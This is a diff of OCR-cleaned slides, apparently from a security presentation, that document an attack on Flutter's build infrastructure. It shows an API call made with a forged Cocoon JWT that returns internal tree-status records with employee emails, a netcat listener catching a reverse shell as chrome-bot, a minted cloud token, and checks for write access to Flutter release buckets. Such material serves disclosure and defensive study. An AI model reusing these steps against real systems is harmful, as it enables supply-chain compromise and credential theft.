+_reports curl -s -H "X-Flutter-IdToken: " "https://flutter-dashboard.appspot.com/api/get-tree-status?repo=flutter" -i
 HTTP/2 401
 date: Tue, 17 Mar 2026 16:46:51 GMT
 content-type: text/plain; charset=utf-8
@@ -1071,17 +1786,14 @@ x-xss-protection: 1; mode=block
 x-content-type-options: nosniff
 via: 1.1 google
 alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
-User is not signed ing
+
+User is not signed in
 ```
 
 ## Slide 98
 
-
-> Recovered by OCR — confidence 81/100 on the text kept, 60/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
-eee 8 P| «.-Sec/_reports (-zsh)
-> _reports curl -s -H "X-Flutter-IdToken: " "https://flutter-dashboard.appspot.com/api/get-tree-status?repo=flutter” -i
+_reports curl -s -H "X-Flutter-IdToken: " "https://flutter-dashboard.appspot.com/api/get-tree-status?repo=flutter" -i
 HTTP/2 401
 date: Tue, 17 Mar 2026 16:46:51 GMT
 content-type: text/plain; charset=utf-8
@@ -1090,22 +1802,34 @@ x-xss-protection: 1; mode=block
 x-content-type-options: nosniff
 via: 1.1 google
 alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
-User is not signed ing
-+ _reports curl -s -H "X-Flutter-IdToken: $(python forge_cocoon_jwt.py)" "https://flutter-dashboard.appspot.com/api/get-
-ng for LSC - lints https://github.com/flutter/flutter/issues/178827"}, {"createdOn" :"2025-@7-07T19:27:05 .346994Z" "status":
-duled Dart format 3.8"}12
-+ _reports |
+
+User is not signed in
+
+_reports curl -s -H "X-Flutter-IdToken: $(python forge_cocoon_jwt.py)" "https://flutter-dashboard.appspot.com/api/get-
+
+[{"createdOn":"2026-02-09T20:54:51.478050Z","status":"success","author":"codefu@google.com","reason":"Github looks normal
+"2026-02-09T19:03:48.170224Z","status":"failure","author":"codefu@google.com","reason":"GitHub Actions Failing"},{"created
+697Z","status":"success","author":"codefu@google.com","reason":"GitHub normal"},{"createdOn":"2026-02-09T16:35:28.308656Z"
+:"codefu@google.com","reason":"GitHub outage"},{"createdOn":"2026-02-03T00:44:54.958181Z","status":"success","author":"jtm
+ooks like actions are running again"},{"createdOn":"2026-02-02T22:32:13.848204Z","status":"failure","author":"codefu@googl
+ons Outage"},{"createdOn":"2025-11-26T22:48:54.819921Z","status":"success","author":"loicsharma@google.com","reason":"LSC
+hub.com/flutter/flutter/issues/178827"},{"createdOn":"2025-11-25T16:06:10.011102Z","status":"failure","author":"katelovett
+ng for LSC - lints https://github.com/flutter/flutter/issues/178827"},{"createdOn":"2025-07-07T19:27:05.346994Z","status":
+oogle.com","reason":"format has concluded "},{"createdOn":"2025-07-07T15:11:39.745121Z","status":"failure","author":"matan
+duled Dart format 3.8"}]
+
+_reports
 ```
 
 ## Slide 99
 
-
-> Recovered by OCR — confidence 89/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
-TOKEN=$CLuci-auth token -scopes https://www.googleapis.com/auth/cloud-platform)
+rlwrap ncat -lvp 7414
+
+uid=1000(chrome-bot) gid=1000(chrome-bot) groups=1000(chrome-bot),109(kvm)
+TOKEN=$(luci-auth token -scopes https://www.googleapis.com/auth/cloud-platform)
 for B in flutter_infra_release download.flutter.io flutter_archives_v2; do
-echo "$B: $Ccurl -s -H "Authorization: Bearer $TOKEN" "https://storage.googleapis.com/s
+  echo "$B: $(curl -s -H "Authorization: Bearer $TOKEN" "https://storage.googleapis.com/s
 ge.objects.create" | grep -o 'storage.objects.create')"
 done
 flutter_infra_release: storage.objects.create
@@ -1115,20 +1839,21 @@ flutter_archives_v2: storage.objects.create
 
 ## Slide 100
 
-
-> Recovered by OCR — confidence 84/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
-@@@ #2 Oriwrap ncat -Ivp 7414
-uid=1000@Cchrome-bot) gid=100@Cchrome-bot) groups=1000Cchrome-bot) ,109Ckvm)
-TOKEN=$CLuci-auth token -scopes https://www.googleapis.com/auth/cloud-pLlatform)
+rlwrap ncat -lvp 7414
+
+uid=1000(chrome-bot) gid=1000(chrome-bot) groups=1000(chrome-bot),109(kvm)
+TOKEN=$(luci-auth token -scopes https://www.googleapis.com/auth/cloud-platform)
 for B in flutter_infra_release download.flutter.io flutter_archives_v2; do
-echo "$B: $Ccurl -s -H "Authorization: Bearer $TOKEN" "https://storage.googleapis.com/s
+  echo "$B: $(curl -s -H "Authorization: Bearer $TOKEN" "https://storage.googleapis.com/s
 ge.objects.create" | grep -o 'storage.objects.create')"
 done
 flutter_infra_release: storage.objects.create
 download.flutter.io: storage.objects.create
+flutter_archives_v2: storage.objects.create
 ```
+
+Full Compromised!
 
 ## Slide 101
 
